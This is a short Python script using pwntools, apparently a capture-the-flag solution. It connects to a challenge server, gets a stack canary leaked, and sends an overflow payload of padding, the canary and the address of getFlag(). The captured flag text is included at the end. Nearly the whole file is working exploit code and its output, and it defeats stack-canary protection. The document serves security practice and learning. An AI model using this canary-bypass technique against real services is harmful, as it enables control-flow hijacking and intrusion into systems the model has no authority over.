from pwn import *

__author__ = "Vegar Kvaavik"

#Adress getFlag() = 00000000004007f7

address = p64(0x4007f7) 			## Packing 64-bit integer to bytes


r = remote('server address', port)


print(r.recvline()) 				## "What does the canary say?"

"""The offset to the canary is 16"""
print(r.sendline(b'16')) ## 16			


"""Receving canary as unsigned long"""
canary = r.recvlineS() 				## Example: 12880692535006160896 = Canary
print("\n")
print(f"canary as unsigned long: {canary}")

print(f"canary as hex: {hex(int(canary))}")
print("\n")


print(r.recvline())  				## "Try to get flag by inputing value"


"""Sending the payload which is 24 bytes padding, the leaked canary, 8 bytes padding and finally the address of getFlag()"""
r.sendline(b"\x90"*24 + p64(int(canary)) + b"\x90"*8 + address)

print(r.recvall())


""" FLAG: b'Congrats! you can get the flag\nkamogimukirivezuhufukowebetebiwo\n'
"""

